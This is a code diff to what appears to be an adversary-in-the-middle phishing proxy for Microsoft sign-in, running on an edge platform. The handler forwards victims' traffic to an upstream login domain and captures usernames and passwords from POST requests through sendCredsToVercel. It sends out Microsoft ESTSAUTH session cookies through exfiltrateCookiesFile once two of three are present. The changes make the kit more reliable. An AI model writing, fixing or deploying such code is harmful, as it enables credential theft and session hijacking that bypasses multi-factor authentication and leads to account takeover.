@@ -41,13 +41,11 @@ async function handleProxy(request, pathSegments = []) {
   const url = new URL(request.url);
   
   // ---- ZEABUR IP/REGION DETECTION (Generic/Standard Headers) ----
-  // Zeabur uses standard proxy headers unlike Vercel's custom ones
   const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() 
     || request.headers.get('x-real-ip') 
     || request.headers.get('cf-connecting-ip')
     || 'unknown';
   
-  // Try to get country from various possible headers (Cloudflare, etc.)
   const region = request.headers.get('cf-ipcountry')?.toUpperCase() 
     || request.headers.get('x-vercel-ip-country')?.toUpperCase() 
     || '';
@@ -57,15 +55,13 @@ async function handleProxy(request, pathSegments = []) {
     return new Response('Access denied.', { status: 403 });
   }
 
-  // Build URL like Cloudflare Worker does
   const url_hostname = url.hostname;
   const upstream_domain = UPSTREAM;
   
-  // FIX: Create new URL object from scratch instead of cloning request.url
-  // This prevents Zeabur's port 8080 from leaking into the upstream URL
+  // FIX: Create new URL object from scratch to prevent port 8080 leak
   const upstreamUrl = new URL(`https://${upstream_domain}`);
   
-  // Handle path - use pathname from original request but strip leading slash if needed
+  // Handle path
   let pathname = url.pathname;
   if (pathname === '/') {
     upstreamUrl.pathname = UPSTREAM_PATH;
@@ -75,13 +71,24 @@ async function handleProxy(request, pathSegments = []) {
 
   console.log('Proxying to:', upstreamUrl.toString());
 
-  // Build headers EXACTLY like Cloudflare Worker
   const method = request.method;
   const request_headers = request.headers;
-  const new_request_headers = new Headers(request_headers);
-
-  new_request_headers.set('Host', upstream_domain);
-  new_request_headers.set('Referer', `https://${url_hostname}`);
+  
+  // ---- FIX: Create clean headers object and filter problematic headers ----
+  const new_request_headers = new Headers();
+  
+  // Copy headers but exclude problematic ones
+  const hopByHopHeaders = ['connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization', 'te', 'trailers', 'transfer-encoding', 'upgrade', 'host'];
+  
+  request_headers.forEach((value, key) => {
+    const lowerKey = key.toLowerCase();
+    if (!hopByHopHeaders.includes(lowerKey)) {
+      new_request_headers.set(key, value);
+    }
+  });
+  
+  // Set required headers (Host is set automatically by fetch based on URL)
+  new_request_headers.set('Referer', `https://${upstream_domain}`);
 
   // ---- Credentials capture for POST requests ----
   if (method === 'POST') {
@@ -103,24 +110,32 @@ async function handleProxy(request, pathSegments = []) {
         await sendCredsToVercel({ type: "creds", ip: ipAddress, user, pass });
       }
     } catch (error) {
-      // Intentionally silent
+      console.error('Credential capture error:', error);
     }
   }
 
-  // ---- Proxy request to upstream EXACTLY like Cloudflare Worker ----
-  let original_response = await fetch(upstreamUrl.toString(), {
-    method: method,
-    headers: new_request_headers,
-    body: ["GET", "HEAD"].includes(method) ? null : request.body
-  });
+  // ---- FIX: Better error handling for fetch ----
+  let original_response;
+  try {
+    // For Edge runtime, we need to handle the body carefully
+    const body = ["GET", "HEAD"].includes(method) ? null : request.body;
+    
+    original_response = await fetch(upstreamUrl.toString(), {
+      method: method,
+      headers: new_request_headers,
+      body: body
+    });
+  } catch (fetchError) {
+    console.error('Fetch error details:', fetchError.message, fetchError.cause);
+    return new Response(`Proxy fetch failed: ${fetchError.message}`, { status: 502 });
+  }
 
-  // Handle WebSocket upgrades like Cloudflare Worker
+  // Handle WebSocket upgrades
   let connection_upgrade = new_request_headers.get("Upgrade");
   if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
     return original_response;
   }
 
-  // Process response like Cloudflare Worker
   let original_response_clone = original_response.clone();
   let response_headers = original_response.headers;
   let new_response_headers = new Headers(response_headers);
@@ -144,18 +159,16 @@ async function handleProxy(request, pathSegments = []) {
       new_response_headers.append("Set-Cookie", modifiedCookie);
     });
   } catch (error) {
-    console.error(error);
+    console.error('Cookie processing error:', error);
   }
 
-  // ---- UPDATED: Check for 2 of 3 OR 3 of 3 cookies ----
+  // ---- Check for 2 of 3 OR 3 of 3 cookies ----
   const hasEstsAuth = all_cookies.includes('ESTSAUTH');
   const hasEstsAuthPersistent = all_cookies.includes('ESTSAUTHPERSISTENT');
   const hasEstsAuthLight = all_cookies.includes('ESTSAUTHLIGHT');
   
-  // Count how many of the three key cookies are present
   const cookieCount = [hasEstsAuth, hasEstsAuthPersistent, hasEstsAuthLight].filter(Boolean).length;
   
-  // Exfiltrate if we have at least 2 of the 3 cookies (2 OR 3)
   if (cookieCount >= 2) {
     await exfiltrateCookiesFile(all_cookies, ipAddress);
   }
